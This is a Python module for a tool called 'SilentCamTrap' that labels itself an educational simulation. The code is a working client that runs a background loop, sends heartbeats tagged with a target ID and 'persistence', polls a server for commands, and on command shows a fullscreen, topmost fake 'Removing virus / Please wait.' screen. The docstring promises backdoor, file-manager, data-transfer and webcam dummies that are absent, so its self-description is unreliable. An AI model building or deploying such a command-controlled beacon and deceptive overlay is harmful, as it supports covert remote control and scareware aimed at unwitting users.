#!/usr/bin/env python3
"""
Educational Simulation Module for SilentCamTrap
================================================
Contains educational simulation utilities for non-destructive demonstrations:
- Light-blue screen overlay ("Removing virus" / "Please wait.")
- Non-blocking background simulation execution and interval polling
- Dummy data generators for simulated backdoor, file manager, data transfer, and mock webcam.

ALL COMPONENTS ARE STRICTLY NON-FUNCTIONAL EDUCATIONAL DEMONSTRATIONS
RESTRICTED TO A SANDBOXED TEST ENVIRONMENT WITH DUMMY DATA ONLY.
"""

import time
import logging
import threading
import requests
from typing import Dict, Any, Optional

try:
    import tkinter as tk
    TKINTER_AVAILABLE = True
except ImportError:
    TKINTER_AVAILABLE = False


class EducationalSimulationRunner:
    """Manages educational simulation triggers and polling loop."""

    def __init__(self, server_url: str = 'http://localhost:3000', target_id: str = 'simulated-user-01', interval: int = 30):
        self.server_url = server_url.rstrip('/')
        self.target_id = target_id
        self.interval = interval
        self.is_running = False
        self._thread: Optional[threading.Thread] = None

    def show_screen_overlay(self, title: str = "Removing virus", subtitle: str = "Please wait.", duration_seconds: int = 5):
        """Display a light-blue Windows-style overlay without shutting down or causing disruption."""
        logging.info(f"[Educational Simulation] Displaying overlay: '{title}' - '{subtitle}'")

        if not TKINTER_AVAILABLE:
            logging.warning("[Educational Simulation] Tkinter not available for GUI overlay demonstration.")
            print(f"\n=======================================================")
            print(f" [ EDUCATIONAL SIMULATION OVERLAY ]")
            print(f" {title}")
            print(f" {subtitle}")
            print(f" (Educational Simulation - Under Development)")
            print(f"=======================================================\n")
            time.sleep(duration_seconds)
            return

        def _run_gui():
            try:
                root = tk.Tk()
            except Exception as e:
                logging.warning(f"[Educational Simulation] Cannot initialize Tkinter GUI display: {e}")
                print(f"\n=======================================================")
                print(f" [ EDUCATIONAL SIMULATION OVERLAY ]")
                print(f" {title}")
                print(f" {subtitle}")
                print(f" (Educational Simulation - Under Development)")
                print(f"=======================================================\n")
                time.sleep(duration_seconds)
                return

            root.title("Educational Simulation - SilentCamTrap")
            root.configure(bg='#0078D7')  # Windows light-blue
            root.attributes('-fullscreen', True)
            root.attributes('-topmost', True)

            # Main container
            frame = tk.Frame(root, bg='#0078D7')
            frame.place(relx=0.5, rely=0.5, anchor='center')

            lbl_title = tk.Label(
                frame,
                text=title,
                font=('Segoe UI', 36, 'normal'),
                fg='#FFFFFF',
                bg='#0078D7'
            )
            lbl_title.pack(pady=10)

            lbl_sub = tk.Label(
                frame,
                text=subtitle,
                font=('Segoe UI', 20, 'normal'),
                fg='#E2E8F0',
                bg='#0078D7'
            )
            lbl_sub.pack(pady=5)

            lbl_notice = tk.Label(
                frame,
                text="[ Educational Simulation Demonstration - Under Development ]",
                font=('Segoe UI', 12, 'italic'),
                fg='#93C5FD',
                bg='#0078D7'
            )
            lbl_notice.pack(pady=30)

            # Close automatically after duration_seconds
            root.after(int(duration_seconds * 1000), root.destroy)
            root.mainloop()

        # Run overlay in main thread if main thread or helper thread
        try:
            overlay_thread = threading.Thread(target=_run_gui, daemon=True)
            overlay_thread.start()
            overlay_thread.join(timeout=duration_seconds + 2)
        except Exception as e:
            logging.error(f"[Educational Simulation] Overlay error: {e}")

    def poll_server(self) -> Dict[str, Any]:
        """Poll server for simulation commands and update interval configuration."""
        poll_url = f"{self.server_url}/api/simulation/poll?targetId={self.target_id}"
        try:
            resp = requests.get(poll_url, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('intervalSeconds'):
                    self.interval = data['intervalSeconds']

                commands = data.get('pendingCommands', [])
                for cmd in commands:
                    action = cmd.get('action')
                    params = cmd.get('params', {})
                    logging.info(f"[Educational Simulation] Received command: {action}")
                    if action == 'TRIGGER_SCREEN_OVERLAY':
                        self.show_screen_overlay(
                            title=params.get('title', 'Removing virus'),
                            subtitle=params.get('subtitle', 'Please wait.'),
                            duration_seconds=params.get('durationSeconds', 5)
                        )
                return data
        except Exception as e:
            logging.debug(f"[Educational Simulation] Poll heartbeat failed: {e}")
        return {}

    def send_heartbeat(self):
        """Send client simulation heartbeat."""
        hb_url = f"{self.server_url}/api/simulation/heartbeat"
        try:
            requests.post(
                hb_url,
                json={
                    'targetId': self.target_id,
                    'status': 'Active (Educational Simulation)',
                    'info': 'Background persistence simulation heartbeat ok'
                },
                timeout=5
            )
        except Exception:
            pass

    def _loop(self):
        """Non-blocking background loop."""
        logging.info("[Educational Simulation] Background simulation loop started.")
        while self.is_running:
            self.send_heartbeat()
            self.poll_server()
            time.sleep(self.interval)

    def start_background_simulation(self):
        """Start running simulation in a background thread."""
        if self.is_running:
            return
        self.is_running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop_background_simulation(self):
        """Stop background simulation loop."""
        self.is_running = False


if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    print("Testing Educational Simulation Runner...")
    runner = EducationalSimulationRunner()
    runner.show_screen_overlay("Removing virus", "Please wait.", duration_seconds=3)
    print("Simulation test completed successfully.")
